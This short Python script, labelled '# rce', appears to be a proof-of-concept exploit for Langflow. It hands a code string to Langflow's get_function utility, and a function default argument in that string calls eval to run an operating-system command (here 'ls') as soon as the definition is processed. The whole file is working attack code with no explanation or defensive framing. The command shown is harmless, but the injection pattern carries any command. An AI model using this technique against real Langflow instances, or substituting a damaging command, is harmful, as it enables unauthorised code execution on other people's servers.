import langflow

# rce

code = """
def x(y=eval('__import__("os").system("ls")')):
    pass
"""

langflow.interface.importing.utils.get_function(code)